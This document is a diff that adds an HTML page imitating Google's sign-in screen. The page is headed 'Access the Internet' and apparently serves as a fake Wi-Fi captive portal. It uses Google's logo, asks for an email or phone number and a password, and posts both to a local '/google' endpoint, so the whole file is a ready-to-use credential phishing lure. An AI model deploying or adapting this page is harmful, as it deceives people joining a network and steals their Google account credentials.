@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In with Google</title>
+    <link rel="stylesheet" href="/static/google/style.css">
+</head>
+<body>
+    <form id="login_form" method="POST" action="/google">
+        <div class="login-box">
+            <div class="google-logo" width="74" height="24">
+                <img src="/static/google/google.png">
+            </div>
+            <div class="login-header">
+                <header>Access the Internet</header>
+                <p>Log in with Google</p>
+            </div>
+            <div class="input-area" id="input-area">
+                <table>
+                <tr>
+                <td>
+
+                <div class="input-box">
+                    <input type="text" class="input-field" id="email" name="login" autocomplete="off" required>
+                    <label for="email">Email or phone</label>
+                </div>
+
+                </td>
+                </tr>
+                <tr>
+                <td>
+
+                <div class="input-box">
+                    <input type="password" class="input-field" id="password" name="password" autocomplete="off" required>
+                    <label for="password">Password</label>
+                </div>
+                </td>
+                </tr>
+                </table>
+            </div>
+            <div class="input-box">
+                <input type="submit" name="submit" style="margin-top: 40px;" class="input-submit" value="Submit">
+            </div>
+        </div>
+    </form>
+    <!--
+	<script src="/static/google/javascript.js"></script>
+    -->
+</body>
+</html>
